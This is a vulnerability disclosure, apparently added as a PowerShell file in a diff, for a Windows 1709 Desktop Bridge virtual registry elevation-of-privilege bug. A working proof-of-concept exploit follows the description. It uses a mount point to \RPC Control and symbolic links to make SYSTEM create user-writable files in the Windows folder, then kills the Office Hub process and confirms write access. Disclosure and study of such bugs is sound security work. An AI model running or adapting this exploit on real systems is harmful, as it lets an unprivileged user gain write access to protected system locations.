@@ -1,0 +1,112 @@
+<#
+Windows: Windows: Desktop Bridge Virtual Registry Arbitrary File Read/Write EoP
+Platform: Windows 1709 (not tested earlier version)
+Class: Elevation of Privilege
+
+Summary: The handling of the virtual registry for desktop bridge applications can allow an application to create arbitrary files as system resulting in EoP.
+
+Description:
+The desktop bridge functionality introduced in Anniversary edition allows an application to set up a virtual registry to add changes to system hives and user hives without actually modifying the real hives. The configuration of these registry hives is by passing a data structure to the virtual registry driver in the kernel. Loading new hives requires SeRestorePrivilege so the loading of the hives is done in the AppInfo service as part of the Desktop AppX initialization process using the container/silo APIs. In order to have this privilege the registry loader must be called by an administrator, in this case the SYSTEM user.
+
+This is a security issue because the registry hive files are stored inside the user’s profile under %LOCALAPPDATA%\Packages\PackageName\SystemAppData\Helium. It’s possible to replace the directories with mount points/symlinks to redirect file access. This can be used to load arbitrary registry hives including ones not accessible normally by a user, but the most serious consequence of this is if a registry hive is opened for write access the kernel will try and create a couple of log files in the same directory if they don’t already exist. If you redirect the creation of these files to another location using symlinks you can create arbitrary files on disk. 
+
+This also applies to the main hive file as well, but the advantage of the log files is the kernel will create them with the same security descriptor as the main hive which means they can be accessed by the normal user afterwards. The known writable hive files which can be abused in this way are:
+
+User.dat
+UserClasses.data
+Cache\XXXX_COM15.dat
+
+Again we can use the Get/My Office application installed by default. Note that you only need a valid Desktop Bridge application, you don’t need one which actually has a registry.dat file installed as the user hives and com15 hives seem to be created regardless.
+
+This issue is due to a fundamental problem in the implementation of the hive loading APIs, it's dangerous to load hives from a user accessible location as it must be done as an admin to have the required privilege. I've reported similar issues before. Considering the virtual registry driver is the one loading the hive perhaps you could pass a token handle to the driver which the kernel will impersonate during loading, after it's verified the SeRestorePrivilege from the current caller.
+
+NOTE: Please don’t ignore the fact that this can also be used to load arbitrary registry hives that the user normally can’t access, as long the hive is accessible by SYSTEM. I’ve only sent the one issue but you should also ensure that any fix also takes into account the read issue as well.
+
+Proof of Concept:
+
+I’ve provided a PoC as a PowerShell script. You need to install my NtObjectManager module from PSGallery first (using Install-Module NtObjectManager). In order for the exploit to work you need a copy of the Get Office/My Office application installed (I tested with version 17.8830.7600.0).
+
+The exploit works as follows:
+* The Helium\Cache folder is renamed to Cache-X.
+* The Cache folder is recreated as a mount point which redirects to the object manager directory \RPC Control
+* Symbolic links are dropped for the registry hive files. The LOG files are redirected to an arbitrary name in the windows folder.
+
+1) Install the NtObjectManager module and set execution policy for PS to Bypass.
+2) Start the Get/My Office application once to ensure the user directories and registry hives have been created.
+3) Start the poc in powershell, it should print it’s waiting for you to start the Office Hub application.
+4) Start the Get/My Office application, it should be immediately killed.
+
+Note that the PoC will leave the user profile for the Office Hub application broken, you should delete the fake Cache folder and rename the Cache-X folder to try the exploit again.
+
+Expected Result:
+The application creation fails or at least the symbolic links aren’t followed.
+
+Observed Result:
+Two new files are created in the c:\windows folder with potentially arbitrary names which are also writable by a normal user.
+#>
+
+$ErrorActionPreference = "Stop"
+
+Import-Module NtObjectManager
+
+function Test-WritablePath {
+    Param($Path)
+    if (Test-Path $Path) {
+        Use-NtObject($file = Get-NtFile "$Path" -Win32Path) {
+            return ($file.GrantedAccess -band "WriteData") -eq "WriteData"
+        }
+    }
+    return $false
+}
+
+$path = "$env:USERPROFILE\appdata\local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\Cache"
+$newpath = "$path-X"
+$path = Resolve-Path $path
+$files = Get-ChildItem "$path\*.dat"
+$linkpath = "\RPC Control"
+
+Rename-Item $path $newpath
+
+[NtApiDotNet.NtFile]::CreateMountPoint("\??\$path", $linkpath, "")
+
+Use-NtObject($list = [NtApiDotNet.DisposableList[NtApiDotNet.NtSymbolicLink]]::new()) {
+
+    foreach($file in $files) {
+        $name = $file.Name
+
+        $link = New-NtSymbolicLink "$linkpath\$name" "\??\$newpath\$name"
+        $list.Add($link) | Out-Null
+        $link = New-NtSymbolicLink "$linkpath\$name.LOG1" "\??\$env:windir\badger.$name.LOG1"
+        $list.Add($link) | Out-Null
+        $link = New-NtSymbolicLink "$linkpath\$name.LOG2" "\??\$env:windir\badger.$name.LOG2"
+        $list.Add($link) | Out-Null
+    }
+
+    Write-Host "Created links, now start Office Hub to complete"
+    
+    while($true) {
+        Use-NtObject($procs = Get-NtProcess -Name "OfficeHubWin32.exe") {
+            if ($null -ne $procs) {
+                Write-Host "Found Process"
+                $procs.Terminate(0)
+                $procs.Wait()
+                # Just wait a bit to ensure files released.
+                Start-Sleep -Seconds 5
+                break
+            }
+        }
+        Start-Sleep -Seconds 1     
+    }
+
+    foreach($file in $files) {
+        $name = $file.Name
+        $test_path = "$env:windir\badger.$name.LOG1"
+        if (Test-WritablePath $test_path) {
+            Write-Host "Found writable file $test_path"
+        }
+        $test_path = "$env:windir\badger.$name.LOG2"
+        if (Test-WritablePath $test_path) {
+            Write-Host "Found writable file $test_path"
+        }
+    }
+}
